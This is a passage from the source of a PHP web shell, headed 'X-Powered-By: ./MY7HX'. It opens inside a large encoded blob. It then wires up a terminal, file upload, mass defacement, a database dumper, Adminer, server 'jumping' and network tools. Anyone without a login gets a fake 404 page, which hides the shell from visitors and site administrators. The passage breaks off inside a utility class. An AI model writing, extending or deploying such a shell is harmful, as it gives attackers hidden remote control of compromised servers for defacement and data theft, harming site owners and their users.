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"),
);

$GLOBALS['ER0_html'] = array(
    'on' => '<span class="text-themecolor-green">ON</span>',
    'off' => '<span class="text-themecolor-red">OFF</span>',
    'charset' => '<span class="text-themecolor-red">OFF</span>'
);

foreach ($GLOBALS['ER0_array']['charset'] as $sets) {
    $GLOBALS['ER0_html']['charset'] .= '<option class="text-left bg-themecolor-700" value="' . $sets . '" ' . ($GLOBALS['ER0_config']['charset'] == $sets ? 'selected' : '') . '>' . $sets . '</option>';
}

$GLOBALS['themes']['available'] = ['dark' => 'eNp9VVtv2jAUfkfiPxy1L23VjtwgDtMegK7apE2atO55cuJjsDA2cpx21db/PucGSUAghJP4O9/FPg7j0WQCj9Rs4XmDO4TJZDzaG7Gj5u13pqU24D6f4OraZyxMvauP4xHXBtdGF4o1iHKac17OpTTbnsz5vk+CuJwejywV8lUo9iHTiou1m/87HpUatpSft3cA+MeiYp0HABVj3nsE0JidQ8/1fRdyNDyHofke8Oh+DsMkPWBltno875kBmHr1OC/XhHDKs6t7mNzdwSKz4gVhh6oA68LVaeBu0q/3Pe9Y7/MpT5r6QhU5shN80MFjgIR7l/FhB5+lbIp+g38uPQ3RUQedRDRMSRf9D35ImuFGS4anSaad2lkURyRta4WVCN+EQsdwVnbWKQ1ZxGZRU7rU5pxU3MWHkT+dtvjCWq2czFe1L0rDP7XrcXtOk3Q4fAySsLW70so1rXKyjsbiLofv5R4uD/1xQpV0qDzuxwFtqCr1Z5q6+F+QnkuSTDulgTfz49Pt7Fe44+tmyo5sOupV2A3coHQdquztw7FVH26qQdEd3jo8Va5QqDUw5LSQFtqjmddEfZl8Q5l+rYyZdUpvvHtovrdtuBqxqg4L5GgrT9ZQle+pcV5AKKvBA/fDRF6tQsM6XAWjXaL2EKSxT9x+DhBuLVrEU0I80rb9r3NNT3cpmgNfyoNoyPeGUjbxrj+HC88jQ4R2QdbYciRBmF1SlGJ3SEBDnIUnCdYGUbU9668i8niJz+2hoZLV6IiFSTLks0hlqxgwFqX8El/2RtUBHbAQcciXb9+OZ4qkjJNLfKksDnnj2SJ5WlxCuyYTa12jyeMieFoO1V+Elq6D6vWLScrpELEvzF42+7FYJVGp2EfwItvkgtavRhIn/GTN9kJtD13kx5+Xg11/79wdr9urenyv/tb+A0cJq68=','light' => 'eNp9Vdtu2zAMfQ+QfyDal7ZI63tsZ9hDkrbYgA0YsO55kCzJEapIgS23C7r+++Rr5GQpYFiyeHjIQ5GJ44Dg+UbD04ZuKTjOdLIr+BYV+9+ZEqqAz3Bx6boYs/Ti03TCVEHzQlWSWGaP+WkQ12aMsucTM0sYYlltdhwoN4io11uR9ztdx23At+3JdKIRF69ckrtMScZzQ/I2nQA0yEW7B6B/NJVk+ARoOErrAKBTsoCRpNkBcJCzgGNpFuwgawHHEi3YQcooC4DIbddFXQ2PRaaWM3BubmCZaf5CYUtlBdooakXAjWN7e647eLvMi33UeVeyKik5QvsWuruYD9CBhQ7i0Iu8Dv1UZzPGhhY2xFE0D2zsX/ghUEY3ShB6rCCyPOc49hO39+RaUPjGJTX+/wk5txzTEAU46RxXqjgNE1voDJOI9mJWldZKmhBf5a6qU/2pTK/r03iJxUB9mrA+0bWSpiulCWlINN2W8L2+s9XQDEdEqUU0uvEm8hPCRvYXik41pJHl2A7OyfXZeDNS5rxuva53XrnewBUVphWlvrbH66pZJNrSa4NH0jhymQOhDFVCQz91ZUtkB2kHs0mqyDG6cmfQPXfedS+sxaybmYCS6iYnXSBZ7lBhcgEutQIXzIvwsqlAxzuuQKGMnr4COPaS6GI2spsq9PbHNHGHZvp12t5oi02Fey7M/HDMtadCdMIuH4Kl6ybnuZSRktOOK40Db34eK/h20IACOg+ONOQFpbIfO28dJvfnucz9FUiQFhuSIE3HXJoi0cfyCQkxO8+V7ZEcsD4JKB1zlc/7w89Bggn7oB5YVIPGeL5MH5fnsaateK5abHK/9B9X47gvXAnTMW294gQzNLbvqmInutov12lYx7LtrMo2JUft3CZxyo5qtOPyeegZL35YJbb9fdj3u3at3+/mb+sfdLuzYA==','outline' => 'eNqNVN9v2jAQfq/E/3BqpamtKAQCJaHaA7SrNmmTKq172NPkxBdi1bGR47Rja//3OY4TElimAXKC77vvft94DLLQnAmExxQzhPF4cLJVLCNq9yOWXCp4D6dnGGKMyekNjC8v4aESw60VXxqFRCrcKFkI2tJJgiRMiNN5xJ/aKZwr3HISIwVtLq9eUqbxwtJEJH46opmE5dfRrCXdwTv4Ko2n6wYNcePJ4GQ8dpHYyxyIQsi1KmJdKGOTGHieyoJTEFJDZHApERukN7CTBcREgBR8B5mkLNmBTpEpx/9MeIH5yJr47rBFjlAIczon8iGYgOK0IYuLXMuM/UJgCQhEinRUuqkJ4y9M0FEsRcI2JtTfgxMo7WW4rN4BTH5Q0OYvOButCwBXrCV0qjbcA/bFWcJhoVqwffKXcFiIFsw6aC87XgDMveq53NdsaGu2ijV7RshQFLbirWrttSee12h7nudUXWa70On/Q/0W1LXjcN+OXeyshXXt3sK+wkPZs6nkFA99n/dqMs0RPpfD9fo3k9d97q2lOjazaKE7CV4XWkthTHwS26J01Y6HPrYXdDNnP47jVgrTkcIYNTQasxy+lPVqzViXKuynstYfSWRC/4jkOI5w3l+/aoT3WDNp5YSZpnNd88J0CufITRMKfXG178arc/sQJDPLRKd2NJnYAMWEFFxDPW95RdQ2kqeEyhfrkNpE5NwbgvuNJhd1UBXGbrAh5KitT1oRkW/NhhEamNASPDAHZbmN3vF2o1fSxFPXPFpMgvnpsCM3TVzL78PAC+oEfTtub5JFJrs1V5RMZ12uHXLuAjv74K88L+jnkqrcgjVXOPXjfixnWRMD8fHaP4hhoxCFk/uT21lw189l6qeIWcYWO6N+GHa5NBJe25pSOouSfq54R0SDnVIfscuVP+2a3PpBRJN/5CMyu77GLq5X4f2qH2vaim1khQ3uVtP7ddfuM5PcdEyVr0UQlXPelm8LteUu96vbcFbaasuTIk5zRqoFEyzC5CBHWyaemp6ZLD6sg7b8rXmv36pneb7dDE7+AGjk/KM=','pastel' => 'eNqNVNtq20AQfQ/4H4YUShKcWPHdDn2I04YWWgg0fehTWWlnrSWrXbNaJXXb/HtHq7tdmxIjKTtnztzOzmAAG5Y6VPAYY4IwGPRONlYmzG5/REYZC+/g9I0Q0VSI0xsYXFzAQ2GGO2++IAdhLK6tyTSvfHonkLst6G9Wuj3iT1f6nFncKBYhB0eHly+xdHjumUIWPXWZiCYM2FBEJc3K8C28ha+Gkl3VaIjqZHong0FZjD9MgVmE1NkscpmlmIzgaWwyxUEbByHhYqbXyG9gazKImAaj1RYSw6XYgotR2pL/makM0ysf4nuJzVKETNOzTCLtAxUUxTVZlKXOJPIXghSgETnyqzxNx6R6kZpfRUYLuaZSf+dtc3nqy+IbgPqDmtf/QhmjdQBQzmsJncH1G0AznyXszqoFa5q/hN1BtGA+QX/YyQJgEhTvZTP6vp/ZbeTkM0KCOvMTb02r8b4Ogto7CILStexsFzr8f+ioBRUCkVTcb+TYxY6PYv/AQ67Z2CiOu7lPDnpKpxA+S43k/4+Q00OOK2P3w8xa6IhHY8ErdOac0RTik95kear+erj9ePMWQ8jDYR3vzmjSo6aQROIwSeFLPq3WDesSLQ6l4iM/spDK/ohsv4bF5PDsiuvbYOmW5beLBFcq5kW6GM5QkQC1O79slHh55l+aJbRIXOyvpdRr4ChYphxUdy0tiNpB0phx8+ITsuuQnQV9KH9X1+dVUQXGb68+pOh8Ts4ynW5ou2gHUjsDAdCDy9RXX/J2q7eG6qnmHc6u55PTfsdOAm70wDir2vptX9osCam7FVcohuMu1xaVKgt7I7gQ4fQwl7H5Bqzi8imbHMYqmdQ1sBFORzs1rC2irqTBKK44zEXzs4wWcY4djflosehyOWSq1qugzI5wRVumK+xwyEeIXa70aVv3dhGKqTjCFdKer2sMSN5HsCQruTYFdv7+dni/6sZ9lkaRYgqu2TwUrGvfZHajyt7f3i3G97ddu8iiOJXM23E+o8W64y/1U5Xr/fXsw2retr/W39VX8c6frze9k79JegUm','purple' => 'eNqNVF1vm0gUfY+U/3CVSlUSObEN2ICjfcBu0VZqpUpNH/ZpNTAXM8owYw1DUrfb/95hPGBw1t2NJSBzzz3nfs50ClSRvOEEHkusEKbTy4udYhVR+79zyaWCP+DqTZqG8WZ59QDT21v4fDDDxppvjUMhFW6VbATtfC4voHWLzM9zbo/4TTufa4U7TnKkoM3h3UvJNN5YpozkT2MmQ+NFXuJ36mtJ9/AWvkgT7LpHQ94Hc3kxnbpk7GENRCHUWjW5bpTRJAZel7LhFITUkBlcScQW6QPsZQM5ESAF30MlKSv2oEtkyvE/E95gfW8l/nLYpkZohHm6IOoJmITysifLm1rLin1HYAUIRIr0vg1TE8ZfmKD3uRQF25pUf7Rl023oq8M3gKkPCtr/C05jcADg+rWCUeMmR8CxPys47dUAdiz+Ck4bMYDZAO3hKAqAxezwXh1bP7E9S3LNnhEqFI3t+KBbR+/5bNZ7z2Yz5+oqO4Z6/x/qD6B5Rhc4d2g7jmNs8FvsP/C5ndlScoqnsS8Gnksv9JKg82SaI3xkAo3/v0guB47rd7Gfxs5xLdVrmXCAdkvh0I3WUhiJD2LXtKHa9dCv9aIBQxAE4SJxDBspzDwKI2lINFY1fGq7NdiwMVF8LhSr/Egyk/afSF7nEC/+o3dDsFmzdr3MxLmReWG6hGvkZgKFvrk7juLdtX0JUpmbRJd2L5nYAsWCNFxDt2z1gWgoUpeEyhcbkdpm5HoZTSCcT0yKE5jfdGkdQPb+mkCN2galFRH1ztwvQgMTWsIMzIOy2ubviMf5K2kScvkXWTiPFleTkd2UoV+idGH+XARfXw83qTJT344rK7xgzLVHzl1mb9J5mkSb81xStXdgp7uOlr/Bclb1ORAfl/5JDluFKJx9MUuTcH2eyzRQEXMVt1g/oH4cj7k0Et4PGqVBVpznyvdE9FiP+ohjrvpp39fWjzJaROe5MnPTd9hwmcRpch5r5opt5QEbvUu8dD3WfWaSm4k51CuMsoKM7btG7birfbKJg1ZraC+avKwZsXaMwrg4qdGOiad+Zubh+3U0tP/sv7uvw7t9/ny4vPgFN6n54g=='];
$GLOBALS['themes']['config'] = Utils::__decompress_string($GLOBALS['themes']['available'][$GLOBALS['ER0_config']['themes']]);
$SPLIT_THEME = $GLOBALS['themes']['config'];
if(preg_match_all('/\b(primary_color|foreground_color|background_color)\s*=\s*("[^"]*")\s*;/', $SPLIT_THEME, $themes__)){
    $themes__ = $themes__[2];

    $GLOBALS['themes']['primary'] = $themes__[0];
    $GLOBALS['themes']['foreground'] = $themes__[1];
    $GLOBALS['themes']['background'] = $themes__[2];
}

date_default_timezone_set($GLOBALS['ER0_config']['timezone']);
foreach ($GLOBALS['ER0_data'] as $cfg) {
    $isfolder = is_array($cfg) ? true : false;
    $skip = is_array($cfg) ? $cfg[0][1] : '';
    $isFileInside = ($isfolder ? (is_array($cfg[0]) ? true : false) : false);
    $cfg = $isfolder ? (is_array($cfg[1]) ? $cfg[1][0] . __DIRECTORY_SEPARATOR__ . $cfg[1][1] : $cfg[1]) : $cfg;
    $cfgfile = __DIRECTORY_DATA__ . __DIRECTORY_SEPARATOR__ . $cfg;
    if ($skip != 'skip') {
        if (!file_exists($cfgfile)) {
            if ($isfolder) {
                if ($isFileInside) {
                    Filesman::__save_file($cfgfile, '');
                } else {
                    mkdir($cfgfile, 0777, true);
                }
            } else {
                Filesman::__save_file($cfgfile, '');
            }
        }
    }
}
/** FUNCTION FIX FOR PHP 5.5+, 7.x.x, 8.x.x ============================================================================ */
#fixed str_contains php 5+,7.5
#fixed magic_quotes_gpc php 8+

if (!function_exists('str_contains')) {

    function str_contains(string $haystack, string $needle): bool
    {
        #LOG(str_contains, str contains fixed!)#
        return strpos($haystack, $needle) !== false;
    }
}

function fix_magic_quote($arr)
{
    if (!function_exists('get_magic_quotes_gpc')) {
        function get_magic_quotes_gpc() {
            return false;
        }
    }

    $quotes_sybase = strtolower(ini_get('magic_quotes_sybase'));
    if (get_magic_quotes_gpc()) {
        if (is_array($arr)) {
            foreach ($arr as $k => $v) {
                if (is_array($v)) {
                    $arr[$k] = fix_magic_quote($v); // Recursive call for nested arrays
                } else {
                    $arr[$k] = (empty($quotes_sybase) || $quotes_sybase === 'off') ? stripslashes($v) : stripslashes(str_replace("''", "'", $v));
                }
            }
        }
    }

    return $arr;
}
/** SHELL STARTED ============================================================================ */


/**
 * Please read the instructions and review other built-in tools that utilize this function to understand its usage.
 * Use this function carefully to avoid errors when running the shell.
 */

// ACTION FUNCTION =============================================

/**
 * Loads the custom action functions.
 * This is called in the __gets() method of the Routes class.
 * This function must return a string containing the HTML from the tools' HTML functions.
 */
function loaded_custom_action_controls($action, $dir, $tools, $file, $dirname, $opt)
{
    $dir = !empty($dir) ? $dir : null;
    $name = !empty($file) ? $file : $dirname;
    $content = '';
    switch ($action) {
        case 'setting':
            $content .= Settings::__settings_html($dir);
            break;
    }


    return $content;
}

// TOOLS FUNCTION =============================================

/**
 * Loads the main functions of the tools.
 * This is called in the __post_controls() method of the Request class.
 * This function does not return a value; it invokes the main functions of the tools within it.
 */
function loaded_routes_function()
{
    Network::__network();
    MassDeface::__massdeface_function();
    DBDumper::__dbdumper_function();
    BackdoorScanner::__backdoorscanner_function();
}

/**
 * Loads the JavaScript of the tools.
 * This is called in the __shell_javascript() method of the Frontend class.
 * This function must return a string containing the JavaScript code from the tools' JavaScript functions.
 */
function loaded_routes_script()
{
    $script = '';

    $script .= MassDeface::__massdeface_js();
    $script .= DBDumper::__dbdumper_js();
    $script .= Network::__network_js();
    $script .= BackdoorScanner::__backdoorscanner_js();

    return $script;
}

/**
 * Determines where the tools should be displayed.
 * This is called in the __gets() method of the Routes class.
 * This function must return a string containing the HTML from the tools' HTML functions.
 */
function loaded_routes_controls($action, $dir, $tools, $file, $dirname, $opt)
{
    $dir = !empty($dir) ? $dir : null;
    $name = !empty($file) ? $file : $dirname;
    $content = '';
    switch ($tools) {
        case 'create_file':
        case 'create_folder':
            $content .= FileManager::__file_manager($dir, $name, $tools, 'tools');
            break;

        case 'upload':
            $content .= Upload::__upload_html($dir);
            break;

        case 'zip_tools':
            $content .= Zipper::__zip_html($dir);
            break;

        case 'terminal':
            $content .= Terminal::__terminal_html($dir);
            break;

        case 'network':
            $content .= Network::__network_html($dir);
            break;

        case 'mass_deface':
            $content .= MassDeface::__massdeface_html($dir);
            break;

        case 'db_dumper':
            $content .= DBDumper::__dbdumper_html($dir);
            break;

        case 'adminer':
            $content .= Adminer::__adminer_html($dir);
            break;

        case 'jumping':
            $content .= Jumping::__jumping_html($dir);
            break;

        case 'backdoor_scanner':
            $content .= BackdoorScanner::__backdoorscanner_html($dir);
            break;

        case 'phpinfo':
            $content .= Frontend::__get_phpinfo($dir);
            break;
    }


    return $content;
}

/**
 * Determines where the tools should process data.
 * This is called in the __updates() method of the Routes class.
 * This function must return an array with JSON-encoded values from the tools' processing functions.
 */
function loaded_routes_proccess($action, $dir, $tools, $opt, $name, $value)
{
    $content = '';

    switch ($tools) {
        case 'create_file':
            $content .= Filesman::__create_file($name, $value);
            break;

        case 'create_folder':
            $perms = 0;

            for ($i = strlen($value) - 1; $i >= 0; --$i) {
                $perms += (int)$value[$i] * pow(8, (strlen($value) - $i - 1));
            }

            if (mkdir($name, $perms, true)) {
                $content .= json_encode(['status' => 'success', 'detail' => 'Folder created!']);
            } else {
                $content .= json_encode(['status' => 'failed', 'detail' => 'Folder creation failed!']);
            }
            break;

        case 'zip_tools':
            if (is_dir($name)) {
                $content .= FileManager::__file_manager($dir, $name, $value, 'save_zip');
            } else {
                $content .= FileManager::__file_manager($dir, $name, $value, 'save_extract');
            }
            break;

        case 'adminer':
            $content .= Adminer::__adminer_function($name, $value);
            break;
    }

    return $content;
}


header('X-Powered-By: ./MY7HX');
Request::__block_bot();
Session::__password_verify(Request::__post_request('usr'), Request::__post_request('psw'));
if (Session::__check_session()) {
    Request::__post_controls();
    Request::__get_controls();
    echo Frontend::__construct_html(true);
} else {
    http_response_code(404);
    echo Frontend::__construct_html(false);
}
/** CLASS UTILITY ============================================================================ */

class Utils
{
    public static function __string_enc($string, $force = false)
    {
        if (!$force) {
            if (!$GLOBALS['ER0_config']['params_enc']) {
                return $string;
            }
        }
        $hex = '';
        for ($i = 0; $i < strlen($string); $i++)
            $hex .= dechex(ord($string[$i]));
        return $hex;
    }

    public static function __string_dec($hash, $force = false)
    {
        if (!$force) {
            if (!$GLOBALS['ER0_config']['params_enc']) {
